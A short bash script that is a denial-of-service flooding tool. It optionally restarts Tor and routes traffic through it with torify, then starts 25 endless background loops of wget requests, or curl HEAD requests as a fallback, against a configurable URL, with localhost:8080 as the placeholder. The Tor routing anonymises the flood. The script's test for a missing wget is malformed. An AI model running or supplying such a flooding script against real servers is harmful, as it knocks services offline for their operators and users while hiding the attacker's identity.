#!/bin/bash

#config flags
url="http://localhost:8080"
tor=1
opt=""

#torconf
if [[ $tor == 1 ]]; then
	opt="torify"; pkill tor > /dev/null; tor &
	printf "waiting for tor to start...\n"
	sleep 10
fi

#logic
if !command -v wget > /dev/null; then
	printf "cannot find wget, trying curl\n"
	for wrkr in {1..25}; do
	while true; do
		$opt curl -I "$url" > /dev/null
		printf "!SENT curl  > $url\n"
	done &
	done
fi
if command -v wget > /dev/null; then
	for wgtr in {1..25}; do
	while true; do
		$opt wget "$url" > /dev/null
		printf "!SENT wget > $url\n"
	done &
	done
fi
